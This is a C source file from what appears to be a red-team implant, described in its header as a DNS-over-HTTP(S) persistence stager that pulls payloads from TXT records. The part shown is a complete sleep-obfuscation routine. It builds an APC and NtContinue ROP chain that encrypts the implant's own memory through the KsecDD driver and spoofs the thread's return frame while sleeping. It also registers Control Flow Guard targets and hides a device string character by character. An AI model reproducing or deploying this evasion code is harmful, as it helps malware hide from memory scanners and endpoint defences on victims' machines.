/*-
 *
 * dns over http(s) persistence stager.
 * grabs a binary payload over a txt
 * record before going back to sleep
 * for a specified time.
 *
 * before going to sleep, it will try
 * to obfuscate itself in memory and
 * hide its return address.
 *
 * Copyright (c) 2021 Austin Hudson
 * Copyright (c) 2021 GuidePoint Security LLC
 *
-*/

#include "common.h"

D_SEC(B) NTSTATUS ObfuscateAddFn( PINSTANCE Ins, LPVOID Pointer )
{
	PIMAGE_DOS_HEADER                DosHdr = NULL;
	PIMAGE_NT_HEADERS                NtsHdr = NULL;
	NTSTATUS                         Status = STATUS_SUCCESS;
	SIZE_T                           Length = 0;           
	CFG_CALL_TARGET_INFO             CfInfo = { 0 };
	EXTENDED_PROCESS_INFORMATION     PrInfo = { 0 };

	if ( ! Ins->nt.NtQueryInformationProcess  ||
	     ! Ins->kb.SetProcessValidCallTargets 
	) return STATUS_SUCCESS;

	DosHdr = C_PTR( Ins->nt.Base );
	NtsHdr = C_PTR( U_PTR( DosHdr ) + DosHdr->e_lfanew );
	Length = NtsHdr->OptionalHeader.SizeOfImage;
	Length = ( Length + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

	PrInfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
	PrInfo.ExtendedProcessInfoBuffer = 0;

	Status = Ins->nt.NtQueryInformationProcess(
				NtCurrentProcess(),
				ProcessCookie | ProcessUserModeIOPL,
				&PrInfo,
				sizeof( PrInfo ),
				NULL
				);

	if ( Status == STATUS_SUCCESS ) {
		CfInfo.Flags  = CFG_CALL_TARGET_VALID;
		CfInfo.Offset = U_PTR( Pointer ) - U_PTR( Ins->nt.Base );

		Status = Ins->kb.SetProcessValidCallTargets(
				NtCurrentProcess( ),
				Ins->nt.Base,
				Length,
				1,
				&CfInfo
		) ? STATUS_SUCCESS : NtCurrentTeb()->LastErrorValue;
	};
	return Status;
};

D_SEC(B) NTSTATUS ObfuscateSleep( PINSTANCE Ins, PCONTEXT FakeFrame, PLARGE_INTEGER Timeout )
{
	NTSTATUS          ContextStatus = STATUS_SUCCESS;
	
	HANDLE	          ContextRopThd = NULL;
	HANDLE	          ContextSrcThd = NULL;
	HANDLE	          ContextSyncEv = NULL;
	HANDLE            ContextSecDev = NULL;

	WCHAR             ContextSecStr[ MAX_PATH ];
	CLIENT_ID         ContextSrcCid = { 0 };
	UNICODE_STRING    ContextSrcUni = { 0 };
	IO_STATUS_BLOCK   ContextIoStat = { 0 };
	OBJECT_ATTRIBUTES ContextSrcObj = { 0 };
	OBJECT_ATTRIBUTES ContextSecObj = { 0 };

	ULONG             ContextSusCnt = 0;

	PCONTEXT          ContextRopEnt = NULL;
	PCONTEXT          ContextRopExt = NULL;
	PCONTEXT          ContextRopDel = NULL;
	PCONTEXT          ContextRopSet = NULL;
	PCONTEXT          ContextRopRes = NULL;
	PCONTEXT          ContextRopEnc = NULL;
	PCONTEXT          ContextRopDec = NULL;
	PCONTEXT          ContextStolen = NULL;

	PVOID             ContextMemPtr = NULL;
	SIZE_T            ContextMemLen = 0;
	ULONG             ContextMemPrt = 0;

	PVOID             ContextResPtr = NULL;
	SIZE_T            ContextResLen = 0;
	ULONG             ContextResPrt = 0;

	PCONTEXT          ContextCtxCap = NULL;
	PCONTEXT          ContextCapMem = NULL;
	PCONTEXT          ContextCtxSet = NULL;
	PCONTEXT          ContextCtxRes = NULL;

	ContextMemPtr = Ins->Buffer;
	ContextMemLen = Ins->Length;

	ContextResPtr = Ins->Buffer;
	ContextResLen = Ins->Length;

	ObfuscateAddFn( Ins, C_PTR( Ins->nt.ExitThread ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtContinue ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtTestAlert ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtDelayExecution ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtGetContextThread ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtSetContextThread ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtWaitForSingleObject ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtDeviceIoControlFile ) );
	ObfuscateAddFn( Ins, C_PTR( Ins->nt.NtProtectVirtualMemory ) );

	ContextSrcObj.Length = sizeof( ContextSrcObj );
	ContextSecObj.Length = sizeof( ContextSecObj );

	ContextSecStr[0]  = L'\\';
	ContextSecStr[1]  = L'D';
	ContextSecStr[2]  = L'e';
	ContextSecStr[3]  = L'v';
	ContextSecStr[4]  = L'i';
	ContextSecStr[5]  = L'c';
	ContextSecStr[6]  = L'e';
	ContextSecStr[7]  = L'\\';
	ContextSecStr[8]  = L'K';
	ContextSecStr[9]  = L's';
	ContextSecStr[10] = L'e';
	ContextSecStr[11] = L'c';
	ContextSecStr[12] = L'D';
	ContextSecStr[13] = L'D';
	ContextSecStr[14] = L'\0';
	Ins->nt.RtlInitUnicodeString( &ContextSrcUni, ContextSecStr );
	InitializeObjectAttributes( &ContextSecObj, &ContextSrcUni, 0, 0, NULL );

	ContextStatus = Ins->nt.NtOpenFile(
				&ContextSecDev,
				SYNCHRONIZE | FILE_READ_DATA,
				&ContextSecObj,
				&ContextIoStat,
				FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
				0
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextSrcCid.UniqueProcess = 0;
	ContextSrcCid.UniqueThread  = NtCurrentTeb()->ClientId.UniqueThread;

	ContextStatus = Ins->nt.NtOpenThread(
				&ContextSrcThd,
				THREAD_ALL_ACCESS,
				&ContextSrcObj,
				&ContextSrcCid
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextStatus = Ins->nt.NtCreateThreadEx(
				&ContextRopThd,
				THREAD_ALL_ACCESS,
				NULL,
				NtCurrentProcess(),
				C_PTR( FakeFrame->Rip ),
				NULL,
				TRUE,
				0,
				0xFFFF,
				0xFFFF,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextStatus = Ins->nt.NtCreateEvent( 
				&ContextSyncEv, 
				EVENT_ALL_ACCESS, 
				NULL, 
				1, 
				FALSE
		       		);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextStolen = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextStolen ) {
		goto END_ROP_CHAIN;
	};

	ContextStolen->ContextFlags = CONTEXT_FULL;
	ContextStatus = Ins->nt.NtGetContextThread(
				ContextRopThd,
				ContextStolen
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextRopEnt = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextRopEnt ) {
		goto END_ROP_CHAIN;
	};

	*ContextRopEnt = *ContextStolen;
	ContextRopEnt->ContextFlags = CONTEXT_FULL;
	ContextRopEnt->Rsp = U_PTR( ContextStolen->Rsp );
	ContextRopEnt->Rip = U_PTR( Ins->nt.NtWaitForSingleObject );
	ContextRopEnt->Rcx = U_PTR( ContextSyncEv );
	ContextRopEnt->Rdx = U_PTR( FALSE );
	ContextRopEnt->R8  = U_PTR( NULL );
	*( ULONG_PTR * )( ContextRopEnt->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextRopEnt,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextRopSet = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextRopSet ) {
		goto END_ROP_CHAIN;
	};

	*ContextRopSet = *ContextStolen;
	ContextRopSet->ContextFlags = CONTEXT_FULL;
	ContextRopSet->Rsp = U_PTR( ContextStolen->Rsp - 0x1000 );
	ContextRopSet->Rip = U_PTR( Ins->nt.NtProtectVirtualMemory );
	ContextRopSet->Rcx = U_PTR( NtCurrentProcess() );
	ContextRopSet->Rdx = U_PTR( &ContextMemPtr );
	ContextRopSet->R8  = U_PTR( &ContextMemLen );
	ContextRopSet->R9  = U_PTR( PAGE_READWRITE );
	*( ULONG_PTR *)( ContextRopSet->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;
	*( ULONG_PTR *)( ContextRopSet->Rsp + 0x28 ) = ( ULONG_PTR ) &ContextMemPrt;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextRopSet,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextRopEnc = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextRopEnc ) {
		goto END_ROP_CHAIN;
	};

	*ContextRopEnc = *ContextStolen;
	ContextRopEnc->ContextFlags = CONTEXT_FULL;
	ContextRopEnc->Rsp = U_PTR( ContextStolen->Rsp - 0x2000 );
	ContextRopEnc->Rip = U_PTR( Ins->nt.NtDeviceIoControlFile );
	ContextRopEnc->Rcx = U_PTR( ContextSecDev );
	ContextRopEnc->Rdx = U_PTR( NULL );
	ContextRopEnc->R8  = U_PTR( NULL );
	ContextRopEnc->R9  = U_PTR( NULL );
	*( ULONG_PTR *)( ContextRopEnc->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;
	*( ULONG_PTR *)( ContextRopEnc->Rsp + 0x28 ) = ( ULONG_PTR ) &ContextIoStat;
	*( ULONG_PTR *)( ContextRopEnc->Rsp + 0x30 ) = ( ULONG_PTR ) IOCTL_KSEC_ENCRYPT_MEMORY;
	*( ULONG_PTR *)( ContextRopEnc->Rsp + 0x38 ) = ( ULONG_PTR ) ContextMemPtr;
	*( ULONG_PTR *)( ContextRopEnc->Rsp + 0x40 ) = ( ULONG_PTR ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
	*( ULONG_PTR *)( ContextRopEnc->Rsp + 0x48 ) = ( ULONG_PTR ) ContextMemPtr;
	*( ULONG_PTR *)( ContextRopEnc->Rsp + 0x50 ) = ( ULONG_PTR ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextRopEnc,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextCtxCap = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextCtxCap ) {
		goto END_ROP_CHAIN;
	};

	ContextCapMem = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextCapMem ) {
		goto END_ROP_CHAIN;
	};

	*ContextCtxCap = *ContextStolen;
	ContextCapMem->ContextFlags = CONTEXT_FULL;
	ContextCtxCap->ContextFlags = CONTEXT_FULL;
	ContextCtxCap->Rsp = U_PTR( ContextStolen->Rsp );
	ContextCtxCap->Rip = U_PTR( Ins->nt.NtGetContextThread );
	ContextCtxCap->Rcx = U_PTR( ContextSrcThd );
	ContextCtxCap->Rdx = U_PTR( ContextCapMem );
	*( ULONG_PTR *)( ContextCtxCap->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextCtxCap,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextCtxSet = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextCtxSet ) {
		goto END_ROP_CHAIN;
	};

	*ContextCtxSet = *ContextStolen;
	ContextCtxSet->ContextFlags = CONTEXT_FULL;
	ContextCtxSet->Rsp = U_PTR( ContextStolen->Rsp );
	ContextCtxSet->Rip = U_PTR( Ins->nt.NtSetContextThread );
	ContextCtxSet->Rcx = U_PTR( ContextSrcThd );
	ContextCtxSet->Rdx = U_PTR( FakeFrame );
	*( ULONG_PTR *)( ContextCtxSet->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextCtxSet,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextRopDel = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextRopDel ) {
		goto END_ROP_CHAIN;
	};

	//
	// WAIT FUNCTION GOES HERE
	//

	//
	// Swap this with NtWaitForSingleObject
	// for practicality purposes so that 
	// we can use it on objects.
	//

	*ContextRopDel = *ContextStolen;
	ContextRopDel->ContextFlags = CONTEXT_FULL;
	ContextRopDel->Rsp = U_PTR( ContextStolen->Rsp );
	ContextRopDel->Rip = U_PTR( Ins->nt.NtDelayExecution );
	ContextRopDel->Rcx = U_PTR( FALSE );
	ContextRopDel->Rdx = U_PTR( Timeout );
	*( ULONG_PTR *)( ContextRopDel->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextRopDel,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	//
	// WAIT FUNCTION ENDS HERE
	//

	ContextRopDec = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextRopDec ) {
		goto END_ROP_CHAIN;
	};

	*ContextRopDec = *ContextStolen;
	ContextRopDec->ContextFlags = CONTEXT_FULL;
	ContextRopDec->Rsp = U_PTR( ContextStolen->Rsp - 0x3000 );
	ContextRopDec->Rip = U_PTR( Ins->nt.NtDeviceIoControlFile );
	ContextRopDec->Rcx = U_PTR( ContextSecDev );
	ContextRopDec->Rdx = U_PTR( NULL );
	ContextRopDec->R8  = U_PTR( NULL );
	ContextRopDec->R9  = U_PTR( NULL );
	*( ULONG_PTR *)( ContextRopDec->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;
	*( ULONG_PTR *)( ContextRopDec->Rsp + 0x28 ) = ( ULONG_PTR ) &ContextIoStat;
	*( ULONG_PTR *)( ContextRopDec->Rsp + 0x30 ) = ( ULONG_PTR ) IOCTL_KSEC_DECRYPT_MEMORY;
	*( ULONG_PTR *)( ContextRopDec->Rsp + 0x38 ) = ( ULONG_PTR ) ContextMemPtr;
	*( ULONG_PTR *)( ContextRopDec->Rsp + 0x40 ) = ( ULONG_PTR ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
	*( ULONG_PTR *)( ContextRopDec->Rsp + 0x48 ) = ( ULONG_PTR ) ContextMemPtr;
	*( ULONG_PTR *)( ContextRopDec->Rsp + 0x50 ) = ( ULONG_PTR ) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextRopDec,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextCtxRes = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextCtxRes ) {
		goto END_ROP_CHAIN;
	};

	*ContextCtxRes = *ContextStolen;
	ContextCtxRes->ContextFlags = CONTEXT_FULL;
	ContextCtxRes->Rsp = U_PTR( ContextStolen->Rsp );
	ContextCtxRes->Rip = U_PTR( Ins->nt.NtSetContextThread );
	ContextCtxRes->Rcx = U_PTR( ContextSrcThd );
	ContextCtxRes->Rdx = U_PTR( ContextCapMem );
	*( ULONG_PTR *)( ContextCtxRes->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextCtxRes,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextRopRes = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextRopRes ) {
		goto END_ROP_CHAIN;
	};

	*ContextRopRes = *ContextStolen;
	ContextRopRes->ContextFlags = CONTEXT_FULL;
	ContextRopRes->Rsp = U_PTR( ContextStolen->Rsp - 0x1000 );
	ContextRopRes->Rip = U_PTR( Ins->nt.NtProtectVirtualMemory );
	ContextRopRes->Rcx = U_PTR( NtCurrentProcess() );
	ContextRopRes->Rdx = U_PTR( &ContextResPtr );
	ContextRopRes->R8  = U_PTR( &ContextResLen );
	ContextRopRes->R9  = U_PTR( PAGE_EXECUTE_READ );
	*( ULONG_PTR *)( ContextRopRes->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert ;
	*( ULONG_PTR *)( ContextRopRes->Rsp + 0x28 ) = ( ULONG_PTR ) &ContextResPrt;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextRopRes,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextRopExt = NtMemAlloc( Ins, sizeof( CONTEXT ) );
	if ( ! ContextRopExt ) {
		goto END_ROP_CHAIN;
	};

	*ContextRopExt = *ContextStolen;
	ContextRopExt->ContextFlags = CONTEXT_FULL;
	ContextRopExt->Rsp = U_PTR( ContextStolen->Rsp );
	ContextRopExt->Rip = U_PTR( Ins->nt.ExitThread );
	ContextRopExt->Rcx = U_PTR( NULL );
	*( ULONG_PTR *)( ContextRopExt->Rsp + 0x00 ) = ( ULONG_PTR ) Ins->nt.NtTestAlert;

	ContextStatus = Ins->nt.NtQueueApcThread(
				ContextRopThd,
				Ins->nt.NtContinue,
				ContextRopExt,
				NULL,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextStatus = Ins->nt.NtAlertResumeThread(
				ContextRopThd,
				&ContextSusCnt
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

	ContextStatus = Ins->nt.NtSignalAndWaitForSingleObject(
				ContextSyncEv,
				ContextRopThd,
				TRUE,
				NULL
				);

	if ( ContextStatus != STATUS_SUCCESS ) {
		goto END_ROP_CHAIN;
	};

END_ROP_CHAIN:
	if ( ContextRopDec ) {
		NtMemFree( Ins, ContextRopDec );
	};
	if ( ContextRopEnc ) {
		NtMemFree( Ins, ContextRopEnc );
	};
	if ( ContextCtxRes ) {
		NtMemFree( Ins, ContextCtxRes );
	};
	if ( ContextCtxSet ) {
		NtMemFree( Ins, ContextCtxSet );
	};
	if ( ContextCtxCap ) {
		NtMemFree( Ins, ContextCtxCap );
	};
	if ( ContextCapMem ) {
		NtMemFree( Ins, ContextCapMem );
	};
	if ( ContextRopRes ) {
		NtMemFree( Ins, ContextRopRes );
	};
	if ( ContextRopSet ) {
		NtMemFree( Ins, ContextRopSet );
	};
	if ( ContextRopDel ) {
		NtMemFree( Ins, ContextRopDel );
	};
	if ( ContextRopEnt ) {
		NtMemFree( Ins, ContextRopEnt );
	};
	if ( ContextRopExt ) {
		NtMemFree( Ins, ContextRopExt );
	};
	if ( ContextStolen ) {
		NtMemFree( Ins, ContextStolen );
	};
	if ( ContextRopThd ) {
		Ins->nt.NtTerminateThread( ContextRopThd, STATUS_SUCCESS );
		Ins->nt.NtClose( ContextRopThd );
	};
	if ( ContextSrcThd ) {
		Ins->nt.NtClose( ContextSrcThd );
	};
	if ( ContextSyncEv ) {
		Ins->nt.NtClose( ContextSyncEv );
	};
	if ( ContextSecDev ) {
		Ins->nt.NtClose( ContextSecDev );
	};

	return ContextStatus;
};
